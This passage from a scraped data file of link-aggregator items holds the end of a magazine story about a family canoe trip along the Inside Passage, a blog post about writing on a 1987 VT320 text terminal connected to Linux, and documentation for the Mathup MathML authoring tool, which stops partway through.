Andy Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-family-canoe-trip-legendary-brothers.jpg\" class=\"attachment-full size-full\" alt=\"\" aria-describedby=\"gallery-5-18416\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-family-canoe-trip-legendary-brothers-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-family-canoe-trip-legendary-brothers-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-family-canoe-trip-legendary-brothers-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-family-canoe-trip-legendary-brothers.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\t“Not everyone can do the hardest route, not everyone can be the fastest, but everyone can do their own epic journey. And I think that’s more important. Follow the voice in you that says ‘I want to give it a shot,'” says Andy. | Photo: Courtesy of Alan and Andy Dappen\n\nAfter almost two weeks on the water, we entered the Zimovia Strait, camping on Etlin Island for several days before arriving in Wrangell, wheremy brother and I would dock our canoe and take the ferry south, leaving our father and Andy to complete the last stretch on their own.\nAs I watched my dad and Andy paddle off into the distance to finish a journey they started 43 years earlier, I reflected on how the story of their original 1974 canoe trip, an expedition I never experienced, had impacted me so profoundly. How the stories we tell and the stories we remember are reflections of who we see ourselves to be.\n\nAs children, we don’t have our own stories yet, so maybe we adopt the ones we’re told that most resonate with who we want to be.My parent’s 1974 canoe adventure had been one of those stories.\nFrom an early age, it was infused into my identity, shaping who I thought my parents were, and who I wanted to become. Now, as a father myself, I have many of my own stories to tell. And at the top of the list is an adventure along the Inside Passage that started in 1974 and ended in 2017.\n\nNate Dappen is an award-winning photographer and filmmaker based in New Jersey. His images, films, books and other projects have been featured by National Geographic, Vogue, The Washington Post, Scientific American, The Guardian and World Wildlife Fund.Watch his film inspired by this adventure below.\n\n<iframe title=\"The Passage\" width=\"1068\" height=\"601\" src=\"https://www.youtube.com/embed/H3a4MQh8Vak?feature=oembed&#038;enablejsapi=1\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n\n(function(d,u,ac){var s=d.createElement('script');s.type='text/javascript';s.src='https://a.omappapi.com/app/js/api.min.js';s.async=true;s.dataset.user=u;s.dataset.campaign=ac;d.getElementsByTagName('head')[0].appendChild(s);})(document,58762,'o9jzn4ebcjqyzhmcgllf');\n\n                        TAGSAlaskaBritish ColumbiaCanoeingExpeditionFamilyPaddling Magazine Issue 55\n\n        FacebookTwitterPinterestEmailMix\n\n                                        Previous articleSecrets For Building Your Own Paddling SchoolNext articleWould You Rather Be Paddling With People Or Bears?        <img alt='' src='https://secure.gravatar.com/avatar/0a15c5fb052df370f193755790b99766?s=96&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/0a15c5fb052df370f193755790b99766?s=192&#038;d=blank&#038;r=g 2x' class='avatar avatar-96 photo' height='96' width='96' decoding='async'/>Nate Dappen\n\n    var block_tdi_4 = new tdBlock();\nblock_tdi_4.id = \"tdi_4\";\nblock_tdi_4.atts = '{\"limit\":5,\"ajax_pagination\":\"next_prev\",\"live_filter\":\"cur_post_same_categories\",\"td_ajax_filter_type\":\"td_custom_related\",\"class\":\"td-related-full-width tdi_4\",\"td_column_number\":5,\"block_type\":\"td_block_related_posts\",\"live_filter_cur_post_id\":18303,\"live_filter_cur_post_author\":\"639\",\"block_template_id\":\"\",\"header_color\":\"\",\"ajax_pagination_infinite_stop\":\"\",\"offset\":\"\",\"td_ajax_preloading\":\"\",\"td_filter_default_txt\":\"\",\"td_ajax_filter_ids\":\"\",\"el_class\":\"\",\"color_preset\":\"\",\"ajax_pagination_next_prev_swipe\":\"\",\"border_top\":\"\",\"css\":\"\",\"tdc_css\":\"\",\"tdc_css_class\":\"tdi_4\",\"tdc_css_class_style\":\"tdi_4_rand_style\"}';\nblock_tdi_4.td_column_number = \"5\";\nblock_tdi_4.block_type = \"td_block_related_posts\";\nblock_tdi_4.post_count = \"5\";\nblock_tdi_4.found_posts = \"64\";\nblock_tdi_4.header_color = \"\";\nblock_tdi_4.ajax_pagination_infinite_stop = \"\";\nblock_tdi_4.max_num_pages = \"13\";\ntdBlocksArray.push(block_tdi_4);\nRELATED ARTICLESMORE FROM AUTHOR\n\n                <img width=\"218\" height=\"150\" class=\"entry-thumb\" src=\"https://paddlingmag.com/wp-content/uploads/2024/10/paddling-trips-you-can-do-0-cory-leis-218x150.jpg\"  srcset=\"https://paddlingmag.com/wp-content/uploads/2024/10/paddling-trips-you-can-do-0-cory-leis-218x150.jpg 218w, https://paddlingmag.com/wp-content/uploads/2024/10/paddling-trips-you-can-do-0-cory-leis-436x300.jpg 436w\" sizes=\"(-webkit-min-device-pixel-ratio: 2) 436px, (min-resolution: 192dpi) 436px, 218px\"  alt=\"a woman paddleboards in an idyllic tropical location in Indonesia\" title=\"Our Favorite Paddling Trips You Can Do\" />                Destinations\n\n                Our Favorite Paddling Trips You Can Do\n\n                <img width=\"218\" height=\"150\" class=\"entry-thumb\" src=\"https://paddlingmag.com/wp-content/uploads/2024/10/Boyd-Ruppelt-Victoria-Falls-Zambezi-River-selfie-218x150.jpg\"  srcset=\"https://paddlingmag.com/wp-content/uploads/2024/10/Boyd-Ruppelt-Victoria-Falls-Zambezi-River-selfie-218x150.jpg 218w, https://paddlingmag.com/wp-content/uploads/2024/10/Boyd-Ruppelt-Victoria-Falls-Zambezi-River-selfie-436x300.jpg 436w\" sizes=\"(-webkit-min-device-pixel-ratio: 2) 436px, (min-resolution: 192dpi) 436px, 218px\"  alt=\"The author Boyd Ruppelt below Victoria Falls.\" title=\"Going Pro At 35\" />                Culture\n\n                Going Pro At 35\n\n                <img width=\"218\" height=\"150\" class=\"entry-thumb\" src=\"https://paddlingmag.com/wp-content/uploads/2024/09/expedition-torngat-8-frank-wolf-218x150.jpg\"  srcset=\"https://paddlingmag.com/wp-content/uploads/2024/09/expedition-torngat-8-frank-wolf-218x150.jpg 218w, https://paddlingmag.com/wp-content/uploads/2024/09/expedition-torngat-8-frank-wolf-436x300.jpg 436w\" sizes=\"(-webkit-min-device-pixel-ratio: 2) 436px, (min-resolution: 192dpi) 436px, 218px\"  alt=\"A polar bear tastes the air when he sees us, trying to get our scent\" title=\"Expedition Torngat\" />                Adventures\n\n                Expedition Torngat\n\n                <img width=\"218\" height=\"150\" class=\"entry-thumb\" src=\"https://paddlingmag.com/wp-content/uploads/2024/06/greatest-kayaking-expeditions-0-jaime-sharp-218x150.jpg\"  srcset=\"https://paddlingmag.com/wp-content/uploads/2024/06/greatest-kayaking-expeditions-0-jaime-sharp-218x150.jpg 218w, https://paddlingmag.com/wp-content/uploads/2024/06/greatest-kayaking-expeditions-0-jaime-sharp-436x300.jpg 436w\" sizes=\"(-webkit-min-device-pixel-ratio: 2) 436px, (min-resolution: 192dpi) 436px, 218px\"  alt=\"silhouetted view of Freya Hoffmeister on one of her greatest kayaking expeditions\" title=\"Greatest Kayaking Expeditions Of The Century (So Far)\" />                Adventures\n\n                Greatest Kayaking Expeditions Of The Century (So Far)\n\n                <img width=\"218\" height=\"150\" class=\"entry-thumb\" src=\"https://paddlingmag.com/wp-content/uploads/2024/05/klamath-river-0-noahs-river-adventures-218x150.jpg\"  srcset=\"https://paddlingmag.com/wp-content/uploads/2024/05/klamath-river-0-noahs-river-adventures-218x150.jpg 218w, https://paddlingmag.com/wp-content/uploads/2024/05/klamath-river-0-noahs-river-adventures-436x300.jpg 436w\" sizes=\"(-webkit-min-device-pixel-ratio: 2) 436px, (min-resolution: 192dpi) 436px, 218px\"  alt=\"a group of rafters paddle down the renowned Hells Canyon section of the Klamath River\" title=\"Last Call On The Klamath River\" />                Features\n\n                Last Call On The Klamath River\n\n\t\tLEAVE A REPLY Cancel reply\n\n                Please enter your comment!\n\n\t\t\t            Please enter your name here\n\n\t\t\t            You have entered an incorrect email address!\n\t\t\t            Please enter your email address here\n\nSave my name, email, and website in this browser for the next time I comment.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "5e2295e89b87ee44",
    "title": {
      "en": "Blogging like it's 1987: A blog post from my old text terminal",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://pointinthecloud.com/2025-03-15-190000.html",
    "score": 5,
    "by": "ftvkyo",
    "time": 1742672033,
    "content": "Written on the 15th March 2025.\n\nI'm writing this on a black and yellow screen that is 38 years old, and I'm really enjoying it.\n\nWhen I was a student I heard word from a friend that a local company were getting rid of their old minicomputer system.\n\nThe minicomputer was about the size of a large fridge and connected to a bunch of screens, called \"terminals\". These terminals aren't any use on their own; they need to talk to a separate computer. This was usually in an air conditioned \"machine hall\" - similar to the cloud datacentres of today.\n\nThe company had an office near the Usher Hall in the centre of Edinburgh, so a bunch of us nerds descended one Friday night and were invited to haul  away what we could carry.\n\nUnfortunately the DEC Microvax mini computer (being the size of a fridge) had to stay (the bus company gets a bit upset with this kind of thing), but I figured I could carry a VT320 terminal under my arm.\n\nApart from a few uses the terminal has sat unused for many years since, but I thought it would be nice to dig it out, blow the dust off and write this blog post using it.\n\nThe march of progress since the 1970s means that the terminal can connect to a modern laptop\nwhich is a bit easier than having to bring along a fridge. (Although by \"modern laptop\" I mean my 15  year old netbook computer, considered obsolete today).\n\nI've got to admit: I'm really enjoying writing this on the terminal. The screen scrolls quite slowly and this gives it quite a calm feeling. There is nothing on the screen apart from the text I'm writing. The text is a lovely glowing amber colour, which feels warming.\n\nI think we need more distraction free computing. Some might think that a  38-year old computer screen is obsolete, but I think we can learn from these systems. Why do people have to  throw out computers every three years only to buy a new one which does just the same thing, only with more adverts and distractions?\n\nIf you want more:\n\n\"LGR\" has made a good video (YouTube) DEC VT320: The Classic 1987 Library Computer Terminal\n\nThe details, if you wish:\n\nGraphics\n\nThere are lots of animations here: http://artscene.textfiles.com/vt100. Some of them are really creative. This can only be the result of the amazing  drive to procrastinate instead of writing a dissertation. Some of the people signed their creations - I wonder where they are now, some forty something years later?\n\nThe VT320 is one of the fancier terminals. It has 96 user definable characters\nand this allows sort-of graphics. https://vt100.net/dec/vt320/soft_characters. We played around with the 'gif320' program that lets you display images on the screen (with a bit of imagination), which made the picture above.\n\nThe Linux configuration\n\nThe Linux operating system could be considered the grand-child of one of the UNIX operating\nsystems that ran on these big old computers. It may have evolved to run on modern computers with large colour screens, but it can still talk to these old terminals. The Edinburgh Hacklab has the necessary cables, so off I headed (Or so I thought, but not quite - thanks Tim for coming to my rescue).\n\nI used an FTDI-232 USB to serial cable to connect to my old netbook. A CH340 adapter looked like it would work, but often hung, for reasons unknown. A null-modem adapter is needed, along with a 25pin to 9pin connection cable.\n\nThe netbook is running the 'Antix' Linux distribution, which doesn't use systemd. I edited the '/etc/inittab' file and added the following line:\n\nU0:23:respawn:/sbin/getty -L ttyUSB0 9600 vt100\n\n…the process is different for Linux distributions running 'systemd'.\n\nThe terminal \"comm settings\" were set to:\n\nXoff at 128\nRS-232, data leads only\nTransmit=9600, Receive=Transmit\n\nI wrote the post using the 'vim' editor, but emacs also worked, though it did crash sometimes.\n\nhttps://vt100.net has lots of documentation.\n\nThe great-grandfather of the VT320 - the DEC VT05 terminal looks (in my opinion) really great, in a 1970s retro-future way.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "530d84be27c89db3",
    "title": {
      "en": "Mathup: Easy MathML authoring tool with a quick to write syntax",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://mathup.xyz/",
    "score": 118,
    "by": "runarberg",
    "time": 1742576537,
    "content": "Use\n\n                Installation\n                Usage\n                Options\n\n              Philosophy\n\n                    Quick to write / Easy to read\n\n                Why not just use MathJax\n                Why AsciiMath / Why not TeΧ\n\n              Reference\n\n                Reference\n                Basics\n                Numbers\n                Operators\n                Identifiers\n                Text\n                Spaces\n                Fractions\n\n                  Sub and superscripts\n\n                Fenced groups\n                Matrices\n                Tensors\n                Roots\n                Accents\n                Font commands\n                Colors\n\n              Open Source\n\n                  GitHub\n\n                    Bug Reports\n\n                    License (MIT)\n\n          Installation\n\n          npm\n\n          npm install mathup\n\n          import mathup from \"mathup\";\n\n          Client\n\n          Download one of the following:\n\n              Module (full,\n              min)\n\n              Script (full,\n              min)\n\n              Custom element as module (full,\n              min)\n\n              Custom element as script (full,\n              min)\n\n              Stylesheet (full; not needed for custom element)\n\n          …and include the module:\n\n          <script type=\"module\" src=\"mathup.js\"></script>\n<link rel=\"stylesheet\" href=\"mathup.css\" />\n\n          …the custom element:\n\n          <script type=\"module\" src=\"math-up-element.js\"></script>\n\n          …or the script:\n\n          <script src=\"mathup.iife.js\"></script>\n<link rel=\"stylesheet\" href=\"mathup.css\" />\n\n          Usage\n\n            const expression = \"1+1 = 2\";\nconst options = {};  // optional\nconst mathml = mathup(expression, options);\n\nmathml.toString();\n// => \"<math><mrow><mn>1</mn><mo>+</mo><mn>1</mn></mrow><mo>=</mo><mn>2</mn></math>\"\n\nconst mathNode = mathml.toDOM();\n// => [object MathMLElement]\n\n// Update existing <math> node in place\nmathup(\"3-2 = 1\", { bare: true }).updateDOM(mathNode);\n\n            Custom Element\n\n            <math-up\n  display=\"inline\"\n  dir=\"ltr\"\n  decimal-mark=\",\"\n  col-sep=\";\"\n  row-sep=\";;\"\n>\n  1+1 = 2\n</math-up>\n\n            Command line\n\n            npm install -g mathup\nmathup [options] -- <expression>\n\n# or from stdin\necho <expression> | mathup [options]\n\n          Options (with defaults)\n\n          const options = {\n  decimalMark: \".\",   // -m  --decimal-mark=\".\"\n  colSep: \",\",        // -c  --col-sep=\",\"\n  rowSep: \";\",        // -r  --row-sep=\";\"\n  display: \"inline\",  // -d  --display=\"inline\"\n  dir: \"ltr\",         //     --rtl\n  bare: false,        // -b  --bare\n};\n\n            Note: If you pick , as your decimal\n            mark then ; becomes the new default column separator.\n            And if ; is your column separator then the new default\n            row separator becomes ;;. You can use , as\n            both a decimal mark and a row separator if you\n            take care to add a space between the row separator and the following\n            digit. However then you must set both explicitly.\n\n          const options = {\n  decimalMark: \",\",\n  colSep: \",\",\n};\n\n          Quick to write / Easy to read\n\n            This package exposes a single function mathup\n            that intuitively takes simple mathematical expressions—written in a\n            markup language inspired by\n            AsciiMath—and outputs structured\n            MathML.\n\n            You can use it on the command line or on the server as a\n            node package, or in the browser by\n            including the script source. In the browser, you choose how to parse\n            the math in your document—by looking hard for any math-y substrings,\n            parsing all expressions wrapped in $…$, or\n            using some other excellent tools out there that does it for you. And\n            you can choose what to do with the output as well—piping it to\n            another program, inject it streight to the DOM, or just logging it\n            to the console.\n\n          Why not just use MathJax?\n\n            MathJax is an\n            excellent tool that you can safely use if all you want to do is\n            include complex mathematical expressions in a document. However,\n            MathJax is a complex piece of software that does a great deal more\n            than just translate simple expression into structured form, and if\n            that is all you want to do, then MathJax is definitely overkill.\n            Mathup promises to be a lot faster (by doing less) then MathJax.\n            While MathJax will search for expressions, parse them, translate,\n            and render them. Mathup only parses and translates them, and lets\n            the browser do the rendering.\n\n          Why AsciiMath / Why not TeΧ?\n\n            I wrote this tool, because I wanted to be able to author\n            mathematical expressions quickly, with no overhead (imagine\n            1/2 instead of \\frac{1}{2}). TeΧ\n            expressions can easily become verbose and annoying to write\n            (especially on keyboards with complex access to the \\,\n            {, and } keys). However, the purpose of this\n            package is not to give people complete control over MathML\n            in a non-verbose way, the purpose is to make it simple for people to\n            write simple expression. Of course I’ll try to give as much\n            expressive power as possible in the way, but I won’t promise to make\n            all complex things possible.\n\n            If you want full support of MathML, and don’t want to write all\n            those tags perhaps you should look for another tool. There are other\n            great efforts to enable people to author MathML in TeX format, take\n            a look at\n            TeXZilla for\n            example.\n\n        Reference\n\n          Basics\n\n            Mathup uses four of MathML’s token elements (identifiers\n            <mi>, operators <mo>, numbers\n            <mn> and text <mtext>). Mathup\n            recognizes which of these you mean when you write simple\n            expressions.\n\n          For example: 1+1 = 2 ⇒\n\n          <mrow>\n  <mn>1</mn>\n  <mo>+</mo>\n  <mn>1</mn>\n</mrow>\n<mo>=</mo>\n<mn>2</mn>\n\n          And sin theta ⇒\n\n          <mi>sin</mi><mi>θ</mi>\n\n            Mathup will also recognize most of the unicode characters you’ll\n            write. If a character comes from one of the mathematical operator\n            code blocks it will wrap it in an <mo> tag,\n            otherwise it will be wrapped in an <mi> tag.\n            Additionally d will be wrapped in an\n            <mo> tag if it obviously a part of a\n            differential.\n\n              x ∈ ℝ\n              α ∝ 1\n              π ≈ 3.141592654\n              1+1 = 2\n              3-2 = 1\n\n          Numbers\n\n            Numbers are usually what you think they are (including unicode\n            numerals like Ⅻ or ↋). However if you want to write a number\n            in an odd way (like spelling it out, as a hex string, or as a roman\n            numeral) you can prepend a string with #, (e.g.\n            #0x2A) or—if your number includes a non alphanumeric\n            character—prepend a backticked fence (like in markdown)\n            #`…`like so: #`forty two` or\n            #`` `42 `` to make `42 a number.\n\n                π ≈ ٣٫١٤١٥٩٢٦٥\n\n              (١٠ - ح)^٢ = ٨١ح\n              #`4.2e+01` = 4.2 xx 10^1 = 42\n\n                `rgb`(48, 148, 171) == #`#3094AB`\n\n          Operators\n\n            Anything in the Pc, Pd, Pe,\n            Pf, Pi, Po, Ps,\n            Sm, or So unicode categories is considered\n            an operator. Additionally the symbol character or alphanumeric\n            string immediately following a backslash \\ will become\n            an operator (<mo>). If you need more then one\n            symbol character, or more then one word, as a single operator in the\n            operator (e.g. <mo>for each</mo>), you can\n            fence it following markdown semantics; (e.g.\n            \\`for each` or \\`` ` `` for\n            <mo>`</mo>).\n\n          The following will also map to the respective operator.\n\n            Operational\n\n              .$\n\n                FUNCTION APPLICATION\n                (zero width)\n\n              .*\n\n                INVISIBLE TIMES\n                (zero width)\n\n              .+\n\n                INVISIBLE PLUS\n                (zero width)\n\n              lim\n\n                lim\n\n              mod\n\n                mod\n\n              -\n\n                −\n\n              +-\n\n                ±\n\n              -+\n\n                ∓\n\n              *\n\n                ·\n\n              xx\n\n                ×\n\n              -:\n\n                ÷\n\n              //\n\n                ⁄\n\n              prod\n\n                ∏\n\n              sum\n\n                ∑\n\n              **\n\n                ∗\n\n              @\n\n                ∘\n\n              ^^\n\n                ∧\n\n              vv\n\n                ∨\n\n              nn\n\n                ∩\n\n              uu\n\n                ∪\n\n              int\n\n                ∫\n\n              dint\n\n                ∬\n\n              oint\n\n                ∮\n\n              !=\n\n                ≠\n\n              !==\n\n                ≢\n\n              o+\n\n                ⊕\n\n              ox\n\n                ⊗\n\n              o.\n\n                ⊙\n\n              ^^^\n\n                ⋀\n\n              vvv\n\n                ⋁\n\n              nnn\n\n                ⋂\n\n              uuu\n\n                ⋃\n\n              ***\n\n                ⋆\n\n              |><|\n\n                ⋈\n\n              |><\n\n                ⋉\n\n              ><|\n\n                ⋊\n\n            Miscellaneous\n\n              '\n\n                ′\n\n              ''\n\n                ″\n\n              '''\n\n                ‴\n\n              ''''\n\n                ⁗\n\n              aleph\n\n                ℵ\n\n              del\n\n                ∂\n\n              grad\n\n                ∇\n\n              oc, prop\n\n                ∝\n\n              /_\n\n                ∠\n\n              /_\\\n\n                △\n\n              ||\n\n                ∥\n\n              ~=\n\n                ≅\n\n              ~~\n\n                ≈\n\n              sub\n\n                ⊂\n\n              sup\n\n                ⊃\n\n              sube\n\n                ⊆\n\n              supe\n\n                ⊇\n\n              <>, diamond\n\n                ⋄\n\n              [], square\n\n                □\n\n              <|\n\n                ⊲\n\n              |>\n\n                ⊳\n\n            Relational\n\n              in\n\n                ∈\n\n              !in\n\n                ∉\n\n                -=,\n                ==\n\n                ≡\n\n              <=\n\n                ≤\n\n              >=\n\n                ≥\n\n              -<\n\n                ≺\n\n              >-\n\n                ≻\n\n              -<=\n\n                ⪯\n\n              >-=\n\n                ⪰\n\n              <<<\n\n                ≪\n\n              >>>\n\n                ≫\n\n            Logical\n\n              and\n\n                and\n\n              if\n\n                if\n\n              or\n\n                or\n\n              otherwise\n\n                otherwise\n\n              not\n\n                ¬\n\n              AA\n\n                ∀\n\n              EE\n\n                ∃\n\n              |--\n\n                ⊢\n\n              TT\n\n                ⊤\n\n              _|_\n\n                ⊥\n\n              |==\n\n                ⊨\n\n            Arrows\n\n              <-, larr\n\n                ←\n\n              uarr\n\n                ↑\n\n              ->, rarr\n\n                →\n\n              darr\n\n                ↓\n\n              harr\n\n                ↔\n\n              ->>\n\n                ↠\n\n              >->\n\n                ↣\n\n              |->\n\n                ↦\n\n              lArr\n\n                ⇐\n\n              =>, rArr\n\n                ⇒\n\n                <=>, iff, hArr\n\n                ⇔\n\n              >->>\n\n                ⤖\n\n            Punctuations\n\n              .,\n\n                INVISIBLE SEPARATOR\n                (zero width)\n\n              ...\n\n                …\n\n              :.\n\n                ∴\n\n              vdots\n\n                ⋮\n\n              cdots\n\n                ⋯\n\n              ddots\n\n                ⋱\n\n                \\`lim sup`._(n -> oo) x_n\n\n                  sum_(n=0)^k a_n = a_0 + a_1 + cdots + a_k\n\n                  e = sum_(n=0)^oo 1 / n!\n\n                  bf F @ bf G  :  U sube RR^3 -> RR^2\n\n                  f'(x), f''(x), f'''(x), f''''(x)\n\n                  P_k(x) = f(a) + f'(a)(x-a) + f''(a) / 2! (x-a)^2 + cdots + f^(k)(a) / k! (x-a)^k\n\n                 f(a) - f(b) = int_b^a f'(x) dx\n\n                  grad f(x,y) = ((del f)/(del x) (x, y), (del f)/(del y)(x,y))\n\n                  oint_(del S) bf F * d bf s = dint_S grad xx bf F * d bf s\n\n          Identifiers\n\n            Anything not a number, operator, or text is considered an\n            identifier. This includes latin, greek or arabic letters\n            (A, π, ح) or even emoji. Each\n            character is considered a separate identifier unless they spell out\n            a word found in the tables below or the operator table above.\n\n            You can force any sequence of characters to be a single idendifier\n            by surrounding them in fences (e.g. `Gamma` yields\n            <mi>Gamma</mi> and\n            `` f` `` yields <mi>f`</mi>)\n\n          The following will also produce a single identifier:\n\n            Standard functions\n\n              cos\n\n                cos\n\n              cosh\n\n                cosh\n\n              cot\n\n                cot\n\n              csc\n\n                csc\n\n              cosec\n\n                cosec\n\n              det\n\n                det\n\n              dim\n\n                dim\n\n              gcd\n\n                gcd\n\n              lcm\n\n                lcm\n\n              ln\n\n                ln\n\n              log\n\n                log\n\n              max\n\n                max\n\n              min\n\n                min\n\n              mod\n\n                mod\n\n              sec\n\n                sec\n\n              sin\n\n                sin\n\n              sinh\n\n                sinh\n\n              tan\n\n                tan\n\n              tanh\n\n                tanh\n\n            Greek\n\n              Delta\n\n                Δ\n\n              Gamma\n\n                Γ\n\n              Lambda\n\n                Λ\n\n              Omega\n\n                Ω\n\n              Phi\n\n                Φ\n\n              Pi\n\n                Π\n\n              Psi\n\n                Ψ\n\n              Sigma\n\n                Σ\n\n              Theta\n\n                Θ\n\n              Xi\n\n                Ξ\n\n              alpha\n\n                α\n\n              beta\n\n                β\n\n              chi\n\n                χ\n\n              epsilon\n\n                ɛ\n\n              eta\n\n                η\n\n              gamma\n\n                γ\n\n              kappa\n\n                κ\n\n              lambda\n\n                λ\n\n              mu\n\n                μ\n\n              nu\n\n                ν\n\n              omega\n\n                ω\n\n              phi\n\n                φ\n\n              phiv\n\n                ϕ\n\n              pi\n\n                π\n\n              psi\n\n                ψ\n\n              rho\n\n                ρ\n\n              sigma\n\n                σ\n\n              tau\n\n                τ\n\n              theta\n\n                θ\n\n              upsilon\n\n                υ\n\n              xi\n\n                ξ\n\n              zeta\n\n                ζ\n\n            Additional identifiers\n\n              oo\n\n                ∞\n\n              O/\n\n                ∅\n\n              CC\n\n                ℂ\n\n              NN\n\n                ℕ\n\n              QQ\n\n                ℚ\n\n              RR\n\n                ℝ\n\n              ZZ\n\n                ℤ\n\n              tan = sin/cos\n              sinh x = (e^x - e^ -x) / 2\n              ln x/y = ln x - ln y\n\n                  `Gamma`(theta | alpha, beta) = beta^alpha / Gamma(alpha) theta^(alpha - 1) e^(-beta theta)\n\n              (🍔-🐄 / 🌈)^2 = 🥰\n              lim_(x->oo)\n              `sup`(O/) = -oo\n              min._(x in NN) = 0\n\n          Text\n\n            You can surround anything in double quotes (\"some text\") and it will get displayed as text. If your text annotation\n            contains a quote mark you can surround it with more quotemarks (just\n            like with backtick fences). That is\n            \"\" \"text string\" \"\" will give you\n            <mtext>\"text string\"</mtext>.\n\n                  obrace(a\\`↑↑`b = ubrace(a^a^⋰^a)._(b  \"times\")).^\"\" \"up-arrow\" notation \"\"\n\n          Spaces\n\n            MathML has an element called <mspace>. Two or\n            more spaces in a row will be translated into that element where it\n            makes sense. The width of the space will be:\n\n          \"width\" = { 0.35(n - 1)\\,, if n = 2 or n = 3\n                        0.5(n - 1)\\,,  if n = 4 or n = 5\n                        n - 3\\,,       if n > 5\n\n            Where n is the number of subsequent spaces and\n            width is in units of ex which is\n            the height of the ‘x’ character in your font.\n\n            In addition (mod p) will add 1.65ex\n            of space to the left of the open parenthesis.\n\n                  bb P(x) = 1,     \\for 0 ≤ x ≤ 1\n\n                a^(p-1) == 1  (mod p)\n\n                  QQ = {p, q in ZZ:   p/q}\n\n                  P(A  |  B) = P(B  |  A)P(A) / P(B)\n\n          Fractions\n\n            In MathML you enclose fractions in an\n            <mfrac> element. In Mathup you simply separate\n            the numerator a and the denominator\n            b with a slash (a/b).\n\n            Mathup tries to be smart about what you mean as numerator and\n            denominator by looking at the spaces you surround your\n            subexpressions with, so\n            a+b / c+d is not the same thing as\n            a + b/c + d. Generally a space between the\n            subexpression and the slash will apply the entire subexpression,\n            while no space only aplies what immediately precedes or follows.\n\n              1+2 / 3+4\n              1+2/3+4\n              df = df / dx dx\n              f'(x) = dy / dx\n              f''(x) = (d^2 y) / dx^2\n\n                phi = 1+1/ 1+1/ 1+1/ 1+1/ 1+ddots\n\n          Sub and superscripts\n\n            The underscore will impose the following expression as a subscript\n            on the preceding expression (a_i ⇒\n\n              ai ), the ascii caret will impose a superscript (a^2 ⇒\n\n              a2 ), and the (expression, underscore, caret) / (experssion, caret,\n            underscore) sequence (a_i^2/a^2_i) will\n            impose a sub and superscript on the first expression yielding\n\n                a\n                i\n                2\n               .\n\n            Over and underscripts follow a similar pattern exept with\n            ._ for underscripts and .^ for\n            overscripts. Also lim_x will put x as an\n            underscript, and sum_a^b and prod_a^b will\n            put a and b as under and\n            overscripts.\n\n            Unlike fractions, sub/super and under/overscripts are\n            right-associative\n            and take precedence over fractions. You can strategically place\n            whitespace between the sub/sup, or under/over character and the\n            surrounding sub expressions just like with fractions, e.g.\n            e^ -1/2 yields\n\n                e\n\n                  −\n\n                    1\n                    2\n\n            , while e^ -1 / 2 yields\n\n                  e\n                  −1\n\n                2\n\n            .\n\n              2^2^2^2\n              a^2/b^2\n              e^ -1/x\n              a^2 + b^2 = c^2\n\n              ln x = int_1^x 1/t dt\n\n                  (X^T)_(ij) = X_(ji),    X._(n xx m) <=> (X^T)._(m xx n)\n\n                  phi =.^\"def\" a/b = a+b / a\n\n                  obrace(x + ... + x).^(k   \"times\")\n\n          Fenced Groups\n\n            We can use parenthesis to group terms together. An any unicode open\n            parenthesis (unicode category Ps) starts a fence, and\n            any closing parenthesis (category Pe) closes it. Note\n            that parenthesis don’t have to match, but they do have to come in\n            open/close pairs.\n\n            You denote an unfenced group with {: and\n            :}. You are free to surround the contents of the\n            unfenced group with arbitrary operators and the will become the new\n            fence. For example if you need an open parenthesis to close a group,\n            you can cast them to operators and manually fence the group like so:\n\n            \\]{: a, b :}\\[ ⇒\n\n                ]\n                a,b\n                [\n               .\n\n            Finally, inside groups—along with your normal seperators like\n            ,—you can use the special :|: as group\n            separators. This is especially handy to write\n            bra-ket notation:\n\n            (: Phi :|: Psi :) ⇒\n            ⟨Φ|Ψ⟩.\n\n            Additional fences\n\n              {:a, b:}\n\n                    a\n                    ,\n                    b\n\n              (:a:|:b:)\n\n                    ⟨\n\n                      a\n                      |\n                      b\n\n                    ⟩\n\n              <<a, b>>\n\n                    ⟨\n\n                      a\n                      ,\n                      b\n\n                    ⟩\n\n              |(a, b)|\n\n                    |\n\n                      a\n                      ,\n                      b\n\n                    |\n\n              |:a, b:|\n\n                    |\n\n                      a\n                      ,\n                      b\n\n                    |\n\n              ||(a, b)||\n\n                    ∥\n\n                      a\n                      ,\n                      b\n\n                    ∥\n\n              ||:a, b:||\n\n                    ∥\n\n                      a\n                      ,\n                      b\n\n                    ∥\n\n              |~x~|\n\n                    ⌈\n                    x\n                    ⌉\n\n              |__x__|\n\n                    ⌊\n                    x\n                    ⌋\n\n            Additional fenced shortcuts\n\n              binom(a, b)\n\n                    (\n\n                      a\n                      b\n\n                    )\n\n              abs x\n\n                    |\n                    x\n                    |\n\n              norm x\n\n                    ∥\n                    x\n                    ∥\n\n              ceil x\n\n                    ⌈\n                    x\n                    ⌉\n\n              floor x\n\n                    ⌊\n                    x\n                    ⌋\n\n                binom(n, k) = n! / k!(n-k)!\n\n              P(X :|: mu, sigma)\n\n              a //{: b/c :}// d\n\n                  {x ∈ X :  a < x < b} = \\]{: a, b :}\\[\n\n                  F = {:(del f) / (del x):|_(hat x)_(k-1)\n\n                 |:Psi(t):) = int Psi(x, t) |:x:) dx\n\n                  <<V(t)^2>> = lim_(T->oo) 1/T int_(-T/2)^(T/2) V(t)^2 dt\n\n          Matrices\n\n            Matrices are fenced groups with at least one row separator\n            (;) For example\n            A = [1,2,3; 4,5,6] is a 2×3 matrix and\n            [1,4; 2,5; 3,6] is\n\n                A\n                T\n               . A trailing row break is allowed so you can write a single row\n            matrix as [1,2,3;]. A new-line character can also be\n            used as a row separator.\n\n            All this does is put the outer brackets as a fence around the table\n            